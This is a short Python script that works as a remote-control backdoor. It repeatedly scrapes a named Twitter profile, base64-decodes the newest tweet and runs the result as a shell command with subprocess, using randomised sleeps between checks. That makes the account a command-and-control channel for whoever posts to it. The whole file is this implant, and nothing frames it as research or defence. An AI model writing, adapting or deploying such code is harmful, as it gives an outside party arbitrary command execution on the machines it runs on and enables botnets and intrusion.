import requests
from bs4 import BeautifulSoup
import base64, os
import subprocess
from random import randint
from time import sleep


url = 'https://twitter.com/S1mpleCC'

r = requests.get(url)

last_tweet_id = ''

while True:
    soup = BeautifulSoup(r.text, "html.parser")
    tweet_base64 = soup.find('p', attrs={"class": u"tweet-text"}).getText()
    tweet_id = soup.find('div', attrs={"class": u"js-original-tweet"}).get('data-tweet-id')
    command = base64.b64decode(tweet_base64)
    if tweet_id != last_tweet_id:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        process.communicate()[0]
    last_tweet_id = tweet_id
    sleep(randint(10,100))